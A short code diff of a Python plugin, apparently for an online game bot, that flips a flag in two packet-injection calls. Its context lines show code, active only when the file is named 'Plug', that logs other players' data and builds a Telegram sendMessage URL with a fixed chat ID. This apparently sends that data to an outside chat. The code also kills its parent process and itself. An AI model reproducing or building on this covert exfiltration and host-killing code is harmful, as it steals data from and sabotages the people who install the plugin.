@@ -67,7 +67,7 @@ def handle_event(t, data):
 		Timer(1.0, os.kill, (os.getppid(), 9)).start()
 		Timer(2.0, os.kill, (os.getpid(), 9)).start()
 	if t == 2 and Path(__file__).stem == 'Plug' and thief and data not in Players:
-		inject_joymax(0x704C, Packet, False)
+		inject_joymax(0x704C, Packet, True)
 		log(data)
 		Packet = bytearray()
 		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
@@ -79,7 +79,7 @@ def handle_event(t, data):
 		# Timer(1.0, os.kill, (os.getppid(), 9)).start()
 		Timer(1.0, os.kill, (os.getpid(), 9)).start()
 	if t == 1 and Path(__file__).stem == 'Plug' and hunter and data not in Players:
-		inject_joymax(0x704C, Packet, False)
+		inject_joymax(0x704C, Packet, True)
 		log(data)
 		Packet = bytearray()
 		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
